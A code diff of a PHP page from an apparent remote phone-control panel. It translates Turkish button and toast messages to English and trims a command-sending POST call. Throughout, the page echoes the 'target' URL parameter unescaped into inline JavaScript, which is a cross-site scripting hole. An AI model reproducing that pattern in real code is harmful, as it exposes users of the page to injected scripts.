@@ -13,12 +13,12 @@ $device_id = $_GET['target'];
             <div class="well">
                 <img id="command-sender-id" name="command-sender-id" src="./images/signal-sender.png" style='height:48px;'/>
                 <div class="col-md-10 col-lg-offset-0">
-                    <button type="button" id="btn-update-info" name="btn-update-info" class="btn btn-default">Güncelle</button>
+                    <button type="button" id="btn-update-info" name="btn-update-info" class="btn btn-default">Update</button>
                 </div>
 
                 <div class="row"></div>
                 <br><br>
-                <legend>Telefon Özellikleri</legend>
+                <legend>Phone Information</legend>
                 <div class="row">
                     <table class="table table-striped table-hover ">
                         <thead>
@@ -100,16 +100,16 @@ $device_id = $_GET['target'];
 
 
     $("#command-sender-id").click(function() {
-        $.post( "commands.php", { send_command: true, target:"<?php echo $_GET['target'];?>", type: "device_info", value: true}, function( data, err ) {
+        $.post( "commands.php", { send_command: true, target:"<?php echo $_GET['target'];?>", type: "device_info"}, function( data, err ) {
             if (data.status){
                 Toastify({
-                    text: "Komut gönderildi.!",
+                    text: "Command Sent!",
                     backgroundColor: "linear-gradient(to right, #008000, #00FF00)",
                     className: "info",
                 }).showToast();
             } else {
                 Toastify({
-                    text: "Komut başarısız.!",
+                    text: "Command Failed.!",
                     backgroundColor: "linear-gradient(to right,#FF0000, #990000)",
                     className: "info",
                 }).showToast();
